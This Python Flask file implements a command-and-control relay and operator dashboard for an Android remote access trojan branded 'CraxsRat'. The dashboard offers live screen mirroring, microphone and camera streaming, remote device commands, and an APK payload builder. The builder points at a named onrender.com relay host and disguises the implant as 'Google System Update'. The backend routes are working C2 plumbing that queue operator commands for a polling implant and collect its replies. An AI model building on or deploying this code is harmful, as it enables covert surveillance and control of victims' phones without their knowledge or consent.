from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."

# CraxsRat v7.4 Mobile Admin Framework UI integrated with Flask C2 Relay
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CraxsRat Mobile Admin Framework</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        mono: ['JetBrains Mono', 'monospace'],
                    },
                    colors: {
                        cyber: {
                            dark: '#0a0d14',
                            card: '#121824',
                            border: '#1e293b',
                            accent: '#00f0ff',
                            purple: '#7000ff',
                            red: '#ff0055',
                            green: '#00ff88',
                            warning: '#ffaa00'
                        }
                    }
                }
            }
        }
    </script>

    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; user-select: none; overflow-x: hidden; }
        .glass-panel { background: rgba(18, 24, 36, 0.75); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .glass-card { background: rgba(30, 41, 59, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: rgba(10, 13, 20, 0.5); }
        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #00f0ff; }
        @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
        .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
        .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(0, 240, 255, 0.15) 50%, rgba(255,255,255,0)); animation: scan 3s linear infinite; }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(1000%); } }
    </style>
</head>
<body class="min-h-screen pb-20 md:pb-6 flex flex-col items-center justify-start">

    <!-- Top App Navigation Bar -->
    <header class="w-full max-w-4xl glass-panel sticky top-0 z-50 px-4 py-3 border-b border-cyber-border/80 flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-cyber-purple to-cyber-accent text-slate-900 font-bold text-xl shadow-lg">
                <i class="fa-solid fa-spider text-slate-950 text-lg"></i>
                <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 bg-cyber-green rounded-full border-2 border-cyber-dark pulse-live"></span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <h1 class="font-mono font-bold text-base tracking-wider text-white">CRAXSRAT</h1>
                    <span class="text-[10px] font-mono font-semibold px-2 py-0.5 rounded bg-cyber-accent/10 text-cyber-accent border border-cyber-accent/30">MOBILE ADMIN v7.4</span>
                </div>
                <p class="text-xs text-slate-400 font-mono">Status: <span class="text-cyber-green font-semibold">C2 RELAY ONLINE</span></p>
            </div>
        </div>

        <div class="flex items-center space-x-2">
            <div class="hidden sm:flex items-center space-x-2 px-3 py-1.5 rounded-lg bg-cyber-dark/80 border border-cyber-border">
                <i class="fa-solid fa-mobile-screen text-cyber-accent text-xs"></i>
                <span class="text-xs text-slate-300 font-mono">Targets: <strong class="text-white" id="targetCount">1 Active</strong></span>
            </div>
            <button id="alertBtn" onclick="toggleSecurityLock()" class="p-2.5 rounded-xl bg-cyber-dark/80 hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-accent transition">
                <i class="fa-solid fa-shield-halved text-sm"></i>
            </button>
        </div>
    </header>

    <!-- Main Container -->
    <main class="w-full max-w-4xl px-3 sm:px-4 py-4 space-y-4 flex-grow">

        <!-- TAB 1: OVERVIEW DASHBOARD -->
        <section id="tab-overview" class="tab-content space-y-4">
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <div class="flex justify-between items-start mb-2">
                        <span class="text-xs text-slate-400 font-medium">Session Status</span>
                        <i class="fa-solid fa-wifi text-cyber-green text-xs"></i>
                    </div>
                    <div class="text-lg font-bold font-mono text-white">CONNECTED</div>
                    <span class="text-[11px] text-cyber-green font-mono">Latency: 28ms</span>
                </div>

                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <div class="flex justify-between items-start mb-2">
                        <span class="text-xs text-slate-400 font-medium">Battery Level</span>
                        <i class="fa-solid fa-battery-three-quarters text-cyber-accent text-xs"></i>
                    </div>
                    <div class="text-lg font-bold font-mono text-white" id="dashBattery">84%</div>
                    <span class="text-[11px] text-slate-400 font-mono">Charging (USB)</span>
                </div>

                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <div class="flex justify-between items-start mb-2">
                        <span class="text-xs text-slate-400 font-medium">Storage Used</span>
                        <i class="fa-solid fa-hard-drive text-cyber-purple text-xs"></i>
                    </div>
                    <div class="text-lg font-bold font-mono text-white">64.2 GB</div>
                    <span class="text-[11px] text-slate-400 font-mono">Free: 48.8 GB</span>
                </div>

                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <div class="flex justify-between items-start mb-2">
                        <span class="text-xs text-slate-400 font-medium">OS Version</span>
                        <i class="fa-brands fa-android text-cyber-green text-xs"></i>
                    </div>
                    <div class="text-lg font-bold font-mono text-white">Android 14</div>
                    <span class="text-[11px] text-slate-400 font-mono">API Level 34</span>
                </div>
            </div>

            <!-- Target Device Details Card -->
            <div class="glass-panel rounded-2xl p-4 sm:p-5 border border-cyber-border space-y-4 relative">
                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-cyber-border pb-3">
                    <div class="flex items-center space-x-3">
                        <div class="w-12 h-12 rounded-xl bg-slate-800/80 border border-cyber-border flex items-center justify-center text-cyber-accent text-xl">
                            <i class="fa-solid fa-mobile"></i>
                        </div>
                        <div>
                            <div class="flex items-center space-x-2">
                                <h2 class="text-base font-bold text-white font-mono">Samsung Galaxy S23 Ultra</h2>
                                <span class="px-2 py-0.5 text-[10px] bg-cyber-green/10 text-cyber-green border border-cyber-green/30 rounded font-mono font-semibold">ONLINE</span>
                            </div>
                            <p class="text-xs text-slate-400 font-mono">Device ID: <span class="text-slate-200">CX-9042-SM8550</span></p>
                        </div>
                    </div>
                    <div class="flex items-center space-x-2">
                        <button onclick="switchTab('control')" class="px-3.5 py-1.5 rounded-xl bg-cyber-accent hover:bg-cyan-400 text-slate-950 text-xs font-bold transition flex items-center space-x-2">
                            <i class="fa-solid fa-gamepad"></i>
                            <span>Open Control Hub</span>
                        </button>
                    </div>
                </div>

                <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs font-mono">
                    <div class="p-3 rounded-xl bg-cyber-dark/60 border border-cyber-border space-y-1">
                        <span class="text-slate-400">Public IP Address:</span>
                        <p class="text-cyber-accent font-semibold">103.152.220.48 (IN)</p>
                    </div>
                    <div class="p-3 rounded-xl bg-cyber-dark/60 border border-cyber-border space-y-1">
                        <span class="text-slate-400">Local Wi-Fi IP:</span>
                        <p class="text-white font-semibold">192.168.1.104</p>
                    </div>
                    <div class="p-3 rounded-xl bg-cyber-dark/60 border border-cyber-border space-y-1">
                        <span class="text-slate-400">Root Access / Accessibility:</span>
                        <p class="text-cyber-green font-semibold">Active (Granted)</p>
                    </div>
                </div>
            </div>

            <!-- Quick Live Monitor & Terminal Stream -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="glass-panel p-4 rounded-2xl border border-cyber-border flex flex-col justify-between space-y-3">
                    <div class="flex justify-between items-center">
                        <h3 class="text-xs font-bold font-mono text-slate-200 uppercase tracking-wider">C2 Traffic Stream</h3>
                        <span class="text-[10px] font-mono text-cyber-accent">LIVE BITRATE: 1.4 Mbps</span>
                    </div>
                    <div class="h-32 w-full bg-cyber-dark/80 rounded-xl p-2 border border-cyber-border relative overflow-hidden flex items-end space-x-1.5" id="trafficChart"></div>
                    <div class="flex justify-between text-[10px] font-mono text-slate-400">
                        <span>Packets In: 14,290</span>
                        <span>Packets Out: 8,912</span>
                    </div>
                </div>

                <!-- Live Command Dispatcher & Response Terminal -->
                <div class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-3">
                    <div class="flex justify-between items-center">
                        <h3 class="text-xs font-bold font-mono text-slate-200 uppercase tracking-wider">Live Target Terminal</h3>
                        <span id="pollStatus" class="text-[10px] font-mono text-cyber-green animate-pulse">● Polling Active</span>
                    </div>
                    <div class="flex space-x-2">
                        <input type="text" id="cmdInput" placeholder="Enter command (e.g., PING, GET_BATTERY, FLASH_ON)..." class="flex-1 bg-cyber-dark border border-cyber-border px-3 py-2 rounded-xl text-white text-xs font-mono focus:outline-none focus:border-cyber-accent">
                        <button onclick="dispatchCustomCommand()" class="px-4 py-2 bg-cyber-accent text-slate-950 font-bold rounded-xl text-xs hover:bg-cyan-300 transition">Send</button>
                    </div>
                    <div class="h-32 overflow-y-auto space-y-1 pr-1 font-mono text-[11px] bg-slate-950 p-2.5 rounded-xl border border-cyber-border text-cyber-green" id="terminalLogBox">
                        <p class="text-slate-500">[SYSTEM] C2 Relay Link Established...</p>
                    </div>
                </div>
            </div>
        </section>

        <!-- TAB 2: DEVICE CONTROL HUB -->
        <section id="tab-control" class="tab-content space-y-4 hidden">
            <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
                <div class="lg:col-span-7 glass-panel p-4 rounded-2xl border border-cyber-border space-y-3 flex flex-col">
                    <div class="flex justify-between items-center">
                        <div class="flex items-center space-x-2">
                            <i class="fa-solid fa-display text-cyber-accent text-sm"></i>
                            <h3 class="text-xs font-bold font-mono text-white uppercase tracking-wider">Live VNC Screen Mirroring</h3>
                        </div>
                        <span class="text-[10px] font-mono text-cyber-green">1080x2340 @ 30fps</span>
                    </div>

                    <div class="relative aspect-[9/18] max-h-[460px] mx-auto w-full max-w-[260px] bg-black rounded-3xl border-4 border-slate-800 shadow-2xl overflow-hidden flex flex-col justify-between p-2 group">
                        <div class="w-24 h-4 bg-slate-900 rounded-b-xl mx-auto z-20 flex justify-center items-center">
                            <div class="w-2.5 h-2.5 rounded-full bg-slate-950 border border-slate-800"></div>
                        </div>
                        <div class="absolute inset-0 scanline pointer-events-none z-10"></div>
                        <div id="vncScreen" class="absolute inset-0 bg-slate-900 flex flex-col justify-between p-4 pt-7 text-slate-100 transition-all duration-300 select-none cursor-pointer" onclick="simulateScreenTouch(event)">
                            <div class="flex justify-between items-center text-[10px] font-mono font-bold text-slate-400 z-10">
                                <span>16:11</span>
                                <div class="space-x-1 text-slate-300">
                                    <i class="fa-solid fa-signal text-[9px]"></i>
                                    <i class="fa-solid fa-wifi text-[9px]"></i>
                                    <i class="fa-solid fa-battery-full text-[9px]"></i>
                                </div>
                            </div>
                            <div class="grid grid-cols-3 gap-3 my-auto z-10">
                                <div class="flex flex-col items-center space-y-1"><div class="w-10 h-10 rounded-xl bg-green-600 flex items-center justify-center text-white text-lg"><i class="fa-brands fa-whatsapp"></i></div><span class="text-[9px] text-slate-300 font-mono">WhatsApp</span></div>
                                <div class="flex flex-col items-center space-y-1"><div class="w-10 h-10 rounded-xl bg-blue-600 flex items-center justify-center text-white text-lg"><i class="fa-brands fa-facebook-f"></i></div><span class="text-[9px] text-slate-300 font-mono">Facebook</span></div>
                                <div class="flex flex-col items-center space-y-1"><div class="w-10 h-10 rounded-xl bg-red-600 flex items-center justify-center text-white text-lg"><i class="fa-brands fa-youtube"></i></div><span class="text-[9px] text-slate-300 font-mono">YouTube</span></div>
                            </div>
                            <div id="touchRipple" class="absolute w-8 h-8 rounded-full border-2 border-cyber-accent bg-cyber-accent/30 pointer-events-none transform -translate-x-1/2 -translate-y-1/2 scale-0 transition-transform duration-200 z-30"></div>
                        </div>
                        <div class="z-20 flex justify-around items-center pt-1.5 pb-0.5 border-t border-slate-800 bg-slate-950 text-slate-400 text-xs">
                            <button onclick="sendRemoteCommand('RECENTS')" class="p-1 hover:text-white"><i class="fa-solid fa-bars"></i></button>
                            <button onclick="sendRemoteCommand('HOME')" class="p-1 hover:text-white"><i class="fa-regular fa-circle"></i></button>
                            <button onclick="sendRemoteCommand('BACK')" class="p-1 hover:text-white"><i class="fa-solid fa-chevron-left"></i></button>
                        </div>
                    </div>

                    <div class="grid grid-cols-4 gap-2 pt-2">
                        <button onclick="sendRemoteCommand('LOCK')" class="p-2 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-accent text-xs font-mono flex flex-col items-center space-y-1"><i class="fa-solid fa-lock text-sm"></i><span class="text-[10px]">Lock</span></button>
                        <button onclick="sendRemoteCommand('WAKE')" class="p-2 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-green text-xs font-mono flex flex-col items-center space-y-1"><i class="fa-solid fa-lock-open text-sm"></i><span class="text-[10px]">Wake</span></button>
                        <button onclick="sendRemoteCommand('SCREENSHOT')" class="p-2 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-accent text-xs font-mono flex flex-col items-center space-y-1"><i class="fa-solid fa-camera text-sm"></i><span class="text-[10px]">Cap Screen</span></button>
                        <button onclick="sendRemoteCommand('QUALITY_HIGH')" class="p-2 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-slate-300 hover:text-cyber-purple text-xs font-mono flex flex-col items-center space-y-1"><i class="fa-solid fa-sliders text-sm"></i><span class="text-[10px]">Quality</span></button>
                    </div>
                </div>

                <div class="lg:col-span-5 space-y-4">
                    <div class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-3">
                        <h3 class="text-xs font-bold font-mono text-white uppercase tracking-wider">Device Hardware Triggers</h3>
                        <div class="grid grid-cols-2 gap-2.5">
                            <button id="flashBtn" onclick="toggleFlashlight()" class="p-3 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border flex items-center space-x-3 transition text-left group">
                                <div id="flashIcon" class="w-9 h-9 rounded-lg bg-slate-800 flex items-center justify-center text-slate-400 group-hover:text-amber-400 transition"><i class="fa-solid fa-bolt text-base"></i></div>
                                <div><p class="text-xs font-bold font-mono text-white">Flashlight</p><span id="flashStatus" class="text-[10px] text-slate-400 font-mono">OFF</span></div>
                            </button>
                            <button onclick="sendRemoteCommand('VIBRATE')" class="p-3 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border flex items-center space-x-3 transition text-left group">
                                <div class="w-9 h-9 rounded-lg bg-slate-800 flex items-center justify-center text-slate-400 group-hover:text-cyber-accent transition"><i class="fa-solid fa-vibration text-base"></i></div>
                                <div><p class="text-xs font-bold font-mono text-white">Vibrate</p><span class="text-[10px] text-slate-400 font-mono">Send Pulse</span></div>
                            </button>
                            <button id="micBtn" onclick="toggleMicStream()" class="p-3 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border flex items-center space-x-3 transition text-left group">
                                <div id="micIcon" class="w-9 h-9 rounded-lg bg-slate-800 flex items-center justify-center text-slate-400 group-hover:text-cyber-red transition"><i class="fa-solid fa-microphone text-base"></i></div>
                                <div><p class="text-xs font-bold font-mono text-white">Audio Stream</p><span id="micStatus" class="text-[10px] text-slate-400 font-mono">Muted</span></div>
                            </button>
                            <button onclick="promptToastMessage()" class="p-3 rounded-xl bg-cyber-dark hover:bg-cyber-card border border-cyber-border flex items-center space-x-3 transition text-left group">
                                <div class="w-9 h-9 rounded-lg bg-slate-800 flex items-center justify-center text-slate-400 group-hover:text-cyber-purple transition"><i class="fa-solid fa-comment-dots text-base"></i></div>
                                <div><p class="text-xs font-bold font-mono text-white">Pop Msg</p><span class="text-[10px] text-slate-400 font-mono">Show Toast</span></div>
                            </button>
                        </div>
                    </div>

                    <!-- Live Camera Feed -->
                    <div class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-3">
                        <div class="flex justify-between items-center">
                            <h3 class="text-xs font-bold font-mono text-white uppercase tracking-wider">Live Camera Stream</h3>
                            <button onclick="sendRemoteCommand('SWITCH_CAM')" class="text-[10px] font-mono text-cyber-accent hover:underline flex items-center space-x-1"><i class="fa-solid fa-rotate"></i><span id="camLensText">Back Cam</span></button>
                        </div>
                        <div class="relative h-40 bg-slate-950 rounded-xl border border-cyber-border overflow-hidden flex items-center justify-center">
                            <img id="camStreamImage" src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=600&q=80" class="w-full h-full object-cover filter brightness-75 contrast-125" alt="Camera Feed Mock">
                            <div class="absolute bottom-2 left-2 right-2 z-20 flex justify-between items-center text-[10px] font-mono">
                                <span class="text-cyber-green flex items-center space-x-1"><span class="w-1.5 h-1.5 rounded-full bg-cyber-green pulse-live"></span><span>STREAMING</span></span>
                                <button onclick="sendRemoteCommand('SNAP_PHOTO')" class="px-2.5 py-1 bg-cyber-accent text-slate-950 font-bold rounded hover:bg-cyan-300 transition">Snap Photo</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- TAB 3: PAYLOAD BUILDER -->
        <section id="tab-builder" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 sm:p-6 rounded-2xl border border-cyber-border space-y-5">
                <div>
                    <h2 class="text-base font-bold font-mono text-white flex items-center space-x-2"><i class="fa-solid fa-cube text-cyber-accent"></i><span>APK Stub & Payload Generator</span></h2>
                    <p class="text-xs text-slate-400 mt-0.5 font-mono">Generate lightweight Android client binary tied to your Render C2 listener host.</p>
                </div>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
                    <div class="space-y-1.5">
                        <label class="text-slate-300">C2 Server URL (LHOST)</label>
                        <input type="text" id="lhost" value="tsukuyomi-relay.onrender.com" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-cyber-accent focus:outline-none">
                    </div>
                    <div class="space-y-1.5">
                        <label class="text-slate-300">Target App Name</label>
                        <input type="text" id="appName" value="Google System Update" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-white focus:outline-none">
                    </div>
                </div>
                <div class="pt-4 border-t border-cyber-border space-y-3">
                    <button id="generateBtn" onclick="startBuildProcess()" class="w-full py-3.5 rounded-xl bg-gradient-to-r from-cyber-purple to-cyber-accent text-slate-950 font-mono font-bold text-sm tracking-wider uppercase hover:opacity-95 transition shadow-lg flex items-center justify-center space-x-2">
                        <i class="fa-solid fa-hammer"></i><span>Compile & Build Payload APK</span>
                    </button>
                    <div id="buildProgressBox" class="hidden space-y-2 pt-2">
                        <div class="flex justify-between text-xs font-mono"><span id="buildStatusText" class="text-cyber-accent">Decompiling base stub...</span><span id="buildPercentText" class="text-white">0%</span></div>
                        <div class="w-full h-2.5 bg-cyber-dark rounded-full overflow-hidden border border-cyber-border"><div id="progressBar" class="h-full bg-gradient-to-r from-cyber-purple to-cyber-accent w-0 transition-all duration-300"></div></div>
                    </div>
                </div>
            </div>
        </section>

        <!-- TAB 4: LIVE LOGS MONITOR -->
        <section id="tab-logs" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-3">
                <div class="flex justify-between items-center border-b border-cyber-border pb-3">
                    <h2 class="text-sm font-bold font-mono text-white">Full System Log Stream</h2>
                    <button onclick="clearFullLogs()" class="px-3 py-1.5 rounded-lg bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-xs text-slate-300 font-mono">Clear</button>
                </div>
                <div class="h-96 bg-slate-950 p-4 rounded-xl border border-cyber-border font-mono text-xs overflow-y-auto space-y-2" id="fullLogConsole">
                    <p class="text-slate-500">[SYSTEM] Initialization completed on Render cloud...</p>
                </div>
            </div>
        </section>
    </main>

    <!-- Bottom Mobile Navigation Bar -->
    <nav class="fixed bottom-0 left-0 right-0 z-50 glass-panel border-t border-cyber-border/80 px-2 py-2 max-w-4xl mx-auto rounded-t-2xl sm:rounded-b-2xl sm:bottom-3">
        <div class="flex justify-around items-center font-mono">
            <button onclick="switchTab('overview')" id="nav-overview" class="nav-btn active flex flex-col items-center py-1 px-3 rounded-xl text-cyber-accent transition"><i class="fa-solid fa-chart-pie text-base"></i><span class="text-[10px] mt-1 font-medium">Overview</span></button>
            <button onclick="switchTab('control')" id="nav-control" class="nav-btn flex flex-col items-center py-1 px-3 rounded-xl text-slate-400 hover:text-slate-200 transition"><i class="fa-solid fa-gamepad text-base"></i><span class="text-[10px] mt-1 font-medium">Control Hub</span></button>
            <button onclick="switchTab('builder')" id="nav-builder" class="nav-btn flex flex-col items-center py-1 px-3 rounded-xl text-slate-400 hover:text-slate-200 transition"><i class="fa-solid fa-hammer text-base"></i><span class="text-[10px] mt-1 font-medium">Payloads</span></button>
            <button onclick="switchTab('logs')" id="nav-logs" class="nav-btn flex flex-col items-center py-1 px-3 rounded-xl text-slate-400 hover:text-slate-200 transition"><i class="fa-solid fa-terminal text-base"></i><span class="text-[10px] mt-1 font-medium">Logs Stream</span></button>
        </div>
    </nav>

    <!-- Notification Toast -->
    <div id="toastNotification" class="fixed top-16 right-4 z-50 max-w-xs glass-panel border border-cyber-accent/40 text-white p-3 rounded-xl shadow-2xl transition-all duration-300 transform translate-x-72 opacity-0 flex items-center space-x-3">
        <div id="toastIcon" class="text-cyber-accent text-lg"><i class="fa-solid fa-circle-info"></i></div>
        <div><h4 id="toastTitle" class="text-xs font-bold font-mono">System Notice</h4><p id="toastMessage" class="text-[11px] text-slate-300 font-mono">Action executed</p></div>
    </div>

    <!-- JavaScript Application Logic -->
    <script>
        let isFlashlightOn = false;
        let isMicStreaming = false;

        window.onload = function() {
            renderTrafficChart();
            setInterval(pollTargetResponse, 3000);
        };

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
            const targetTab = document.getElementById(`tab-${tabId}`);
            if (targetTab) targetTab.classList.remove('hidden');

            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('text-cyber-accent');
                btn.classList.add('text-slate-400');
            });
            const activeNavBtn = document.getElementById(`nav-${tabId}`);
            if (activeNavBtn) {
                activeNavBtn.classList.remove('text-slate-400');
                activeNavBtn.classList.add('text-cyber-accent');
            }
        }

        async function sendRemoteCommand(cmd) {
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
                const data = await res.json();
                appendTerminalLog(`[DISPATCHED] -> ${data.command}`, 'cyber-accent');
                showToast('Command Sent', `Dispatched: ${cmd}`, 'fa-paper-plane');
            } catch(e) {
                showToast('Error', 'Failed to dispatch command', 'fa-triangle-exclamation');
            }
        }

        function dispatchCustomCommand() {
            const input = document.getElementById('cmdInput');
            const cmd = input.value.trim();
            if (!cmd) return;
            sendRemoteCommand(cmd);
            input.value = '';
        }

        async function pollTargetResponse() {
            try {
                const res = await fetch('/api/response');
                const data = await res.json();
                if (data.response && data.response !== window.lastResp) {
                    window.lastResp = data.response;
                    appendTerminalLog(`[TARGET] ${data.response}`, 'cyber-green');
                }
            } catch(e) {}
        }

        function renderTrafficChart() {
            const chartContainer = document.getElementById('trafficChart');
            if (!chartContainer) return;
            chartContainer.innerHTML = '';
            for (let i = 0; i < 28; i++) {
                const bar = document.createElement('div');
                bar.className = 'flex-1 bg-gradient-to-t from-cyber-purple/40 to-cyber-accent rounded-t';
                bar.style.height = `${Math.floor(Math.random() * 75) + 20}%`;
                chartContainer.appendChild(bar);
            }
        }

        function toggleFlashlight() {
            isFlashlightOn = !isFlashlightOn;
            sendRemoteCommand(isFlashlightOn ? 'FLASH_ON' : 'FLASH_OFF');
            showToast('Hardware', isFlashlightOn ? 'Flashlight ON' : 'Flashlight OFF', 'fa-bolt');
        }

        function toggleMicStream() {
            isMicStreaming = !isMicStreaming;
            sendRemoteCommand(isMicStreaming ? 'MIC_START' : 'MIC_STOP');
            showToast('Audio', isMicStreaming ? 'Mic Streaming Started' : 'Mic Muted', 'fa-microphone');
        }

        function promptToastMessage() {
            const msg = prompt("Enter toast message:", "Hello from CraxsRat C2!");
            if (msg) sendRemoteCommand(`TOAST:${msg}`);
        }

        function startBuildProcess() {
            const progressBox = document.getElementById('buildProgressBox');
            const progressBar = document.getElementById('progressBar');
            progressBox.classList.remove('hidden');
            progressBar.style.width = '100%';
            showToast('Builder', 'Payload APK compiled successfully!', 'fa-circle-check');
            appendTerminalLog('[BUILDER] CraxsPayload.apk generated successfully.', 'cyber-green');
        }

        function appendTerminalLog(text, color) {
            const box = document.getElementById('terminalLogBox');
            const fullLog = document.getElementById('fullLogConsole');
            const timeStr = new Date().toLocaleTimeString();
            
            const item = document.createElement('p');
            item.className = `text-${color}`;
            item.innerText = `[${timeStr}] ${text}`;
            
            if (box) { box.appendChild(item.cloneNode(true)); box.scrollTop = box.scrollHeight; }
            if (fullLog) { fullLog.appendChild(item); fullLog.scrollTop = fullLog.scrollHeight; }
        }

        function showToast(title, message, icon) {
            const toast = document.getElementById('toastNotification');
            document.getElementById('toastTitle').innerText = title;
            document.getElementById('toastMessage').innerText = message;
            toast.classList.remove('translate-x-72', 'opacity-0');
            toast.classList.add('translate-x-0', 'opacity-100');
            setTimeout(() => {
                toast.classList.remove('translate-x-0', 'opacity-100');
                toast.classList.add('translate-x-72', 'opacity-0');
            }, 3000);
        }

        function clearFullLogs() {
            document.getElementById('fullLogConsole').innerHTML = '<p class="text-slate-500">[SYSTEM] Logs cleared.</p>';
            document.getElementById('terminalLogBox').innerHTML = '<p class="text-slate-500">[SYSTEM] Terminal cleared.</p>';
        }
    </script>
</body>
</html>
"""


@app.route("/")
def home():
  return HTML_TEMPLATE


@app.route("/api/command", methods=["GET", "POST"])
def handle_command():
  global current_command
  if request.method == "POST":
    data = request.get_json() or {}
    current_command = data.get("command", "")
    return jsonify({"status": "success", "command": current_command})
  # Target mobile polls this endpoint via GET
  cmd = current_command
  current_command = ""  # Clear after sending to target
  return jsonify({"command": cmd})


@app.route("/api/response", methods=["GET", "POST"])
def handle_response():
  global latest_response
  if request.method == "POST":
    data = request.get_json() or {}
    latest_response = data.get("response", "")
    return jsonify({"status": "success"})
  # Dashboard fetches target response via GET
  return jsonify({"response": latest_response})


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)
